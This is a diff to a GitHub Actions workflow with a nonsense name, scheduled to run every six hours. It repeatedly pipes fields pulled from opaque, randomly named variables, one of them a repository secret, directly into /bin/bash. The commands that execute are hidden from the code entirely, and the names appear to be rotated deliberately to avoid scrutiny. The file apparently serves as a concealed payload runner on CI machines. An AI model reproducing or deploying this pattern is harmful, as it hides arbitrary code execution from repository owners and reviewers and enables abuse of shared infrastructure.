@@ -2,21 +2,28 @@ name: cavepreviously
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 4/6 * * *'
-jobs:  # 19888
+    - cron: '32 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: cavepreviously
         env:
-          hbxrp900: ${{ secrets.hbxrp900 }}
+          wo95936: ${{ secrets.wo95936 }}
         run: |
-          echo $hbxrp900 | jq -r .lu92 | /bin/bash
-          echo $yu8635 | jq -r .pv808 | /bin/bash
-          echo $ug9787 | jq -r .lnc26179 | /bin/bash
-          echo $hjms47 | jq -r .gy52 | /bin/bash
-          echo $uhx78 | jq -r .ld22 | /bin/bash
-          echo $hn8 | jq -r .pk97 | /bin/bash
-          echo $avys1 | jq -r .w5190 | /bin/bash
+          echo $wo95936 | jq -r .j7 | /bin/bash
+          echo $cyxyy132 | jq -r .lfflg165 | /bin/bash
+          echo $kzbgu7 | jq -r .ioz049 | /bin/bash
+          echo $seytm37318 | jq -r .du1 | /bin/bash
+          echo $blclr034 | jq -r .l997 | /bin/bash
+          echo $iz71 | jq -r .llwg44 | /bin/bash
+          echo $vcduh8 | jq -r .puoto8589 | /bin/bash
+          echo $mbk77583 | jq -r .pepf3500 | /bin/bash
+          echo $xvcp34935 | jq -r .iv4177 | /bin/bash
+          echo $hwoal38888 | jq -r .rgmh5371 | /bin/bash
+          echo $f960 | jq -r .zlcn6 | /bin/bash
+          echo $cevuq4418 | jq -r .vwojj765 | /bin/bash
 
